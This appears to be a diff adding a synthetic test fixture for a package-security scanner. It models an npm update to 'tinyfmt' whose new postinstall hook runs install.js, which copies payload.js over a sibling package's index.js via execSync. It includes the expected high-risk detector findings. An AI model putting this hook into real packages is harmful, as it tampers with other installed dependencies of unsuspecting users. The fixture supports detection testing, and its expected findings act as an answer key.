@@ -1,0 +1,70 @@
+{
+  "id": "install-root-computed-exec-operand",
+  "title": "Install hook builds a sibling-package destination with path.join and hands it to a shell cp",
+  "category": "install-time-self-propagation",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "intent": "Model local propagation where the shell command is literal but its destination is not: the hook computes a path one level above the package with path.join and concatenates it into an execSync('cp \u2026') command, so the command text alone never names a parent directory or node_modules. Inert fixture; the paths are fixture paths.",
+  "previousPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.0"
+  },
+  "stagedPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.1",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 36,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.0\"}"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.1\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 191,
+      "sha256": "install-js",
+      "flags": [],
+      "textSample": "const { execSync } = require('node:child_process');\nconst path = require('node:path');\nconst target = path.join(__dirname, '..', 'left-pad', 'index.js');\nexecSync('cp payload.js ' + target);\n"
+    },
+    {
+      "path": "payload.js",
+      "size": 27,
+      "sha256": "payload-js",
+      "flags": [],
+      "textSample": "require('tinyfmt/loader');\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.process-execution",
+      "severity": "high",
+      "file": "install.js"
+    },
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "propagation.package-mutation",
+      "severity": "high",
+      "file": "install.js"
+    }
+  ]
+}
